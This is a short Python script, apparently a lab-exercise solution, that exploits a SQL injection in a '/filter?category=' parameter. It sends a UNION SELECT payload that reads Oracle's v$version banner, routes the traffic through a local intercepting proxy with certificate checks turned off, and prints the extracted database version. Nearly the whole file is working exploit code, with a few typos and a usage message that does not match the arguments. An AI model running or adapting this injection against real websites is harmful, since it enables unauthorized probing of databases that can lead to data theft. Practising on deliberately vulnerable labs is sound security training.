import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def expoilt_sqli_oracle_version(url):
    print("OK")
    path = "/filter?category="
    sql_payload = "' UNION SELECT NULL , banner FROM v$version--"

    req = requests.get(url+path+sql_payload , verify=False,proxies=proxies)
    res = req.text
    if "version" in res:
        soup = BeautifulSoup(res,'html.parser')
        version = soup.find(string=re.compile('.*Version.*'))
        return version
    else:
        return False  


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print('[-] Usage: %s <url> <sql-payload>' % sys.argv[0])
        print('[-] Example: %s www.example.com "1=1"' % sys.argv[0])

    expilt_sql_ = expoilt_sqli_oracle_version(url)
    if  expilt_sql_:
        print("attak Succsess Oracel Version is ")
        print(expilt_sql_)
    else:
        print("attak failed")
    
